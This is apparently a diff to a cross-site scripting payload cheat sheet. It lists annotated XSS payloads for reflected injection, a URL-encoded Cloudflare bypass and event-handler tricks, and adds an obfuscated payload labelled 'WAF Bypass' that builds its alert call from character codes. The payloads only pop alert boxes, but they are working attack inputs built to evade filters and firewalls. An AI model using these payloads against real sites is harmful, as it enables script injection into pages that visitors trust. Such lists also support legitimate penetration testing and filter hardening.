@@ -40,6 +40,7 @@ https://xxx.com/path/"><script>alert(1)</script>                                
 abc`;return false});});alert`xss`;</script>                                        --> For reflected XSS
 abc%60%3Breturn%20false%7D)%3B%7D)%3Balert%60xss%60%3B%3C%2Fscript%3E              --> For reflected XSS
 <Svg Only=1 OnLoad=confirm(atob("Q2xvdWRmbGFyZSBCeXBhc3NlZCA6KQ==")>               --> Do URL encode Cloudflare bypass
+<sCrIpT>(function(){var a=[97,108,101,114,116];var b=String.fromCharCode.apply(null,a);var c=[88,115,112,108,111,105,116];var d=String.fromCharCode.apply(null,c);window[b](d);})()</sCrIpT>      --> WAF Bypass
 <A/hREf="j%0aavas%09cript%0a:%09con%0afirm%0d``">z
 <d3"<"/onclick="1>[confirm``]"<">z
 <d3/onmouseenter=[2].find(confirm)>z
